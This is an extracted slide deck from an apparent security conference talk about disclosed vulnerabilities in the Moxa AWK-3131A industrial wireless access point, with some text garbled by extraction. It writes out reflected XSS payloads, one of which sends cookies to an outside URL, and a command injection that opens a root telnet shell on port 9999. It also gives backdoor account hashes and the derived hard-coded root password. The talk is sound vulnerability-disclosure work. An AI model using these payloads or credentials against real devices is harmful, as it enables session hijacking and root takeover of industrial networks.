P R O T E C T I N G   Y O U R   N E T W O R K
Patrick DeSantis | @pat_r10t 
FROM BOX TO BACKDOOR 
U s i n g  O l d  S c h o o l  To o l s  a n d  Te c h n i q u e s  t o  D i s c o v e r  
B ac k doors  in Modern Dev ic es 
Patrick DeSantis | @pat_r10t 
OVERVIEW 
INTRO: WHO, WHAT, WHY 
MOXA AWK3131A WAP 
MOXA WAP: ABOUT 
“The AWK-3131A is 802.11n compliant to deliver speed, range, and 
reliability to support even the most bandwidth-intensive applications. The 
802.11n standard incorporates multiple technologies, including Spatial 
Multiplexing MIMO (Multi-In, Multi-Out), 20 and 40 MHz channels, and dual 
bands (2.4 GHz and 5 GHz) to provide high speed wireless communication, 
while still being able to communicate with legacy 802.11a/b/g devices. The 
AWK's operating temperature ranges from -25 to 60°C for standard models 
and -40 to 75°C for wide temperature models, and is rugged enough for all 
types of harsh industrial environments. Installation of the AWK is easy using 
DIN-Rail mounting or distribution boxes, and with its wide operating 
temperature range, IP30-rated housing with LED indicators, and DIN-Rail 
mounting it is a convenient yet reliable solution for all types of industrial 
wireless applications.” 
- Moxa 
MOXA WAP: ABOUT TL;DR 
•  It’s an 802.11n Wireless Access Point 
(WAP) 
–  in a din rail mountable enclosure 
–  many of the the parts inside are the same 
as in common SOHO networking devices 
•  Moxa advertises that the AWK series is 
–  "a Perfect Match for Your AGV & AS/RS 
Systems” 
•  Automated Guided Vehicles (AGV) 
•  Automated Storage and Retrieval System 
(AS/RS) 
–  common in Automated Materials Handling 
(AMH) systems. 
MOXA WAP: ABOUT 
•  It’s “Unbreakable” 
–  challenge accepted 
MOXA WAP: DEVICE LIMITATIONS  
•  Limited to about 8k connections per some unit of time 
–  lots of resource exhaustion DoS issues 
–  throttle traffic or wait for recovery 
•  Crashes… a lot 
•  No legit operating system access 
•  Very limited shell environment 
–  most management and configuration done via web app 
•  Crashes… A LOT 
–  so many crashes… 
–  usually needs a reboot to recover 
•  later, we’ll have access to crash dumps and see a lot of these 
crashes are seg faults (want some CVEs?) 
MOXA WAP: DEVICE LIMITATIONS  
MOXA WAP: DEVICE LIMITATIONS  
CVE-2016-8723 Moxa AWK-3131A HTTP GET Denial of Service Vulnerability 
MOXA WAP: FIRMWARE ANALYSIS 
MOXA WAP: FIRMWARE ANALYSIS 
MOXA WAP: SCAN AND ENUM 
22/tcp &
&open&&
&ssh&Dropbear&sshd&0.53&
23/tcp &
&open&&
&telnet&BusyBox&telnetd&
80/tcp &
&open&&
&http&GoAhead&WebServer&
443/tcp&
&open&&
&ssl/http&GoAhead&WebServer&
5801/tcp& &open&&
&Moxa&serviceAgent&(TCP)&
5800/udp&
&open &
&Moxa&serviceAgent&(UDP)&
MOXA WAP: WEB APP 
MOXA WAP: WEB APP 
MOXA WAP: WEB APP 
MOXA WAP: WEB APP - NONCE 
•  cryptographic nonce: 
–  In crypto, a Number used ONCE 
–  Uses 
•  prevents replay attacks 
•  as a pseudo random IV 
•  a salt in hashing algorithms 
• 
not the Urban Dictionary definition of nonce  
– 
“(UK) Slang for paedophile.” (sic) 
MOXA WAP: WEB APP – SESSION 
MOXA WAP: WEB APP - FREEZE NONCE 
MOXA WAP: WEB APP - FREEZE NONCE 
CVE-2016-8712 Moxa AWK-3131A Web Application Nonce Reuse Vulnerability 
MOXA WAP: WEB APP - FIX SESSION 
•  The session token is calculated: 
–  token = MD5( password + nonce ) 
•  The device has only: 
–  1 user (admin) – effectively, there are no users 
–  1 password (default is “root”) 
–  1 nonce (only changes after 5 mins of inactivity) 
THERE IS ONLY 1 VALID SESSION TOKEN AT A TIME! 
MOXA WAP: WEB APP - XSS 
MOXA WAP: WEB APP - XSS 
• 
/client_list.asp&[devIndex&parameter]&
–  devIndex=bikf4">alert(document.cookie)ej77g&
• 
/multiple_ssid_set.asp&[devIndex&parameter]&
–  devIndex=wireless_cert.asp?
index=bikf4">alert(document.cookie)ej77g&
• 
/wireless_cert.asp&[index&parameter]&
–  wireless_cert.asp?
index=bikf4">alert(document.cookie)ej77g&
• 
/wireless_security.asp&[vapIndex&parameter]&
–  vapIndex=bikf4">alert(document.cookie)ej77g&
CVE-2016-8719 Moxa AWK-3131A Web Application Multiple Reflected Cross-Site Scripting Vulnerabilities 
MOXA WAP: WEB APP - XSS 
MOXA WAP: WEB APP - XSS 
&
http:///wireless_cert.asp?index=?
index=%22%3E%3Cscript%3Ewindow.location=%22http
:///test?
cookie=%22.concat%28document.cookie%29%3C/
script%3E&
MOXA WAP: WEB APP - XSS 
MOXA WAP: WEB APP - XSS 
•  We have 
–  user name  
 (hardcoded) 
–  nonce
 (frozen) 
–  session token
 (stolen cookie) 
•  We can easily crack password 
–  it’s just MD5( password + nonce ) 
•  But, we don’t need the password 
–  the nonce isn’t changing 
–  our session token will never become invalid 
MOXA WAP: SESSION HIJACK 
MOXA WAP: WEB APP – OS CMD INJ 
CVE-2016-8721 Moxa AWK-3131A Web Application Ping Command Injection Vulnerability 
MOXA WAP: WEB APP – OS CMD INJ 
;&/bin/busybox&telnetd&-l/bin/sh&-p9999&
MOXA WAP: WEB APP – OS CMD INJ 
MOXA WAP: GET BINARIES 
MOXA WAP: WEB APP - CSRF 
cve 
MOXA WAP: WEB APP - CSRF 
MOXA WAP: BACKDOOR 
q  94jo3dkru4:Zg5SOmmQKk3kA:0:0:root:/:/bin/sh&
&
q  daccli:$1$$oCLuEVgI1iAqOA8pwkzAg1:0:0:root:/:/usr/sbin/daccli&
&
q  netdump:x:34:34:Network&Crash&Dump&user:/var/crash:/bin/bash&
&
q  mysql:x:27:27:MySQL&Server:/var/lib/mysql:/bin/bash&
&
q  admin:ZH0m6QMdLV0Wo:0:0:root:/:/usr/sbin/iw_console&
&
q  art::0:0:art&calibration:/:/etc/art_shell.sh&
MOXA WAP: BACKDOOR 
ü  94jo3dkru4:Zg5SOmmQKk3kA:0:0:root:/:/bin/sh&
&
q  daccli:$1$$oCLuEVgI1iAqOA8pwkzAg1:0:0:root:/:/usr/sbin/daccli&
&
q  netdump:x:34:34:Network&Crash&Dump&user:/var/crash:/bin/bash&
&
q  mysql:x:27:27:MySQL&Server:/var/lib/mysql:/bin/bash&
&
q  admin:ZH0m6QMdLV0Wo:0:0:root:/:/usr/sbin/iw_console&
&
q  art::0:0:art&calibration:/:/etc/art_shell.sh&
MOXA WAP: BACKDOOR 
MOXA WAP: BACKDOOR 
MOXA WAP: BACKDOOR 
&
$&strings&iw_doConfig&|&grep&moxa&
…&&…&
echo&"94jo3dkru4:moxaiw%s"&|&/sbin/chpasswd&
/bin/passwd&-u&94jo3dkru4&-p&"moxaiw%s"&
MOXA WAP: BACKDOOR 
MOXA WAP: BACKDOOR 
•  Sets admin user’s password 
–  We know admin password is “root” 
•  Sets 94jo3dkru4 user’s password 
–  Doesn’t change the value being passed to %s 
–  “moxaiw%s” becomes “moxaiwroot” 
•  This is hard-coded in an initialization binary 
–  runs every time the device boots 
MOXA WAP: BACKDOOR 
MOXA WAP: BACKDOOR 
We have an operating 
system root-level backdoor!!! 
CVE-2016-8717 Moxa AWK-3131A Hard-coded Administrator Credentials Vulnerability 
MOXA WAP: BACKDOOR 
&
iw_system((int32_t)"iw_onekey&%s&&");&
iw_system((int32_t)"killall&-2&%s");&
iw_system((int32_t)"ping&-c&4&%s&1>/var/pingtestlog.txt&2>&1");&
&
iw_system((int32_t)"openssl&aes-256-cbc&-d&-k&moxaiwroot&
-salt&-in&%s&-out&%s");&
&
iw_system((int32_t)"rm&%s");&
iw_system((int32_t)"echo&Import&Fail&>&%s");&
iw_system((int32_t)"touch&%s%s");&
iw_system((int32_t)"cd&%s&&&&tftp&-p&-r&%s&%s&&&&echo&$?&>&%s");&
iw_system((int32_t)"echo&\"TFTP&Server&no&response\"&>&%s");&
iw_system((int32_t)"rm&%s%s");&
MOXA WAP: ATTACK SUMMARY 
Freeze 
Nonce 
XSS 
Session 
Hijack 
CSRF 
Command 
Injection 
Busybox 
Telnet 
Root 
Backdoor 
MOXA WAP: NOW WHAT? 
•  We already have OS root 
•  It’s a “read-only” file system 
•  We already grabbed all the binaries and configs 
•  We could install a backdoor 
–  but it already has one 
•  Lots of binaries already on device can be used to do 
fun things 
MOXA WAP: NOW WHAT? 
80211debug&&&&&&&&&&&&&crontab&&&&&&&&&&&&&&&&find&&&&&&&&&&&&&&&&&&&ip&&&&&&&&&&&&&&&&&&&&&iw_testDevio&&&&&&&&&&&mdev&&&&&&&&&&&&&&&&&&&pwdx&&&&&&&&&&&&&&&&&&&start-stop-daemon&&&&&&uptime&
80211stats&&&&&&&&&&&&&cryptpw&&&&&&&&&&&&&&&&flock&&&&&&&&&&&&&&&&&&ipaddr&&&&&&&&&&&&&&&&&iw_testDo&&&&&&&&&&&&&&mesg&&&&&&&&&&&&&&&&&&&radartool&&&&&&&&&&&&&&stty&&&&&&&&&&&&&&&&&&&users&
[&&&&&&&&&&&&&&&&&&&&&&cttyhack&&&&&&&&&&&&&&&fold&&&&&&&&&&&&&&&&&&&ipcrm&&&&&&&&&&&&&&&&&&iw_troubleshoot&&&&&&&&microcom&&&&&&&&&&&&&&&rdate&&&&&&&&&&&&&&&&&&su&&&&&&&&&&&&&&&&&&&&&usleep&
[[&&&&&&&&&&&&&&&&&&&&&cut&&&&&&&&&&&&&&&&&&&&free&&&&&&&&&&&&&&&&&&&ipcs&&&&&&&&&&&&&&&&&&&iw_typeSizeEnumerator&&mkdir&&&&&&&&&&&&&&&&&&readahead&&&&&&&&&&&&&&sulogin&&&&&&&&&&&&&&&&vconfig&
addgroup&&&&&&&&&&&&&&&date&&&&&&&&&&&&&&&&&&&fsync&&&&&&&&&&&&&&&&&&iperf&&&&&&&&&&&&&&&&&&iw_waitSetup&&&&&&&&&&&mknod&&&&&&&&&&&&&&&&&&readlink&&&&&&&&&&&&&&&sv&&&&&&&&&&&&&&&&&&&&&vi&
adduser&&&&&&&&&&&&&&&&dd&&&&&&&&&&&&&&&&&&&&&fuser&&&&&&&&&&&&&&&&&&iplink&&&&&&&&&&&&&&&&&iw_webs&&&&&&&&&&&&&&&&mkpasswd&&&&&&&&&&&&&&&readprofile&&&&&&&&&&&&svlogd&&&&&&&&&&&&&&&&&virtual_op&
adjtimex&&&&&&&&&&&&&&&delgroup&&&&&&&&&&&&&&&fw_printenv&&&&&&&&&&&&iproute&&&&&&&&&&&&&&&&iw_xmodemTest&&&&&&&&&&mktemp&&&&&&&&&&&&&&&&&realpath&&&&&&&&&&&&&&&sync&&&&&&&&&&&&&&&&&&&vlock&
apstats&&&&&&&&&&&&&&&&deluser&&&&&&&&&&&&&&&&fw_setenv&&&&&&&&&&&&&&iprule&&&&&&&&&&&&&&&&&iwconfig&&&&&&&&&&&&&&&modinfo&&&&&&&&&&&&&&&&reboot&&&&&&&&&&&&&&&&&sysctl&&&&&&&&&&&&&&&&&watch&
arp&&&&&&&&&&&&&&&&&&&&depmod&&&&&&&&&&&&&&&&&getopt&&&&&&&&&&&&&&&&&iptables&&&&&&&&&&&&&&&iwevent&&&&&&&&&&&&&&&&modprobe&&&&&&&&&&&&&&&reg&&&&&&&&&&&&&&&&&&&&syslogd&&&&&&&&&&&&&&&&watchdog&
arping&&&&&&&&&&&&&&&&&df&&&&&&&&&&&&&&&&&&&&&getty&&&&&&&&&&&&&&&&&&iptunnel&&&&&&&&&&&&&&&iwgetid&&&&&&&&&&&&&&&&mount&&&&&&&&&&&&&&&&&&renice&&&&&&&&&&&&&&&&&tail&&&&&&&&&&&&&&&&&&&wc&